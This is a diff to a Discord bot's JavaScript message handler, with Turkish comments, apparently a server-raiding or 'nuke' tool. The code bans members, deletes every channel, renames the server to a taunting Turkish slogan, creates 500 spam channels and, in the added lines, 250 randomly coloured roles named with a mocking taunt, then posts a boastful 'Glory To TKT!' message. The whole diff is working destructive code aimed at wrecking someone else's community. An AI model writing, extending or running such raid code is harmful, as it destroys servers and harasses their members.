@@ -95,21 +95,31 @@ client.on('messageCreate', async (message) => {
       }
     }
 
-    // Tüm kanalları sil (eş zamanlı)
+    // Tüm kanalları sil
     const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
     await Promise.all(deletePromises);
 
     // Sunucu adını değiştir
     await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});
 
-    // 1000 yeni kanal oluştur (TKT💋, FORS💦, ALİLW💝, TKT💋 sırayla)
+    // 500 yeni kanal oluştur
     const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 500; i++) {
       const name = names[i % names.length];
       message.guild.channels.create({ name: name }).catch(() => {});
     }
 
-    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi ve yeniden oluşturuluyor. Glory To TKT!`);
+    // 250 rastgele renkli rol oluştur
+    for (let i = 0; i < 250; i++) {
+      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
+      await message.guild.roles.create({
+        name: 'BÖÖ KORKTUNMUU😜',
+        color: randomColor,
+        hoist: true // listede gösterilsin
+      }).catch(() => {});
+    }
+
+    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi, yeni kanallar ve roller oluşturuldu. Glory To TKT!`);
   }
 });
 
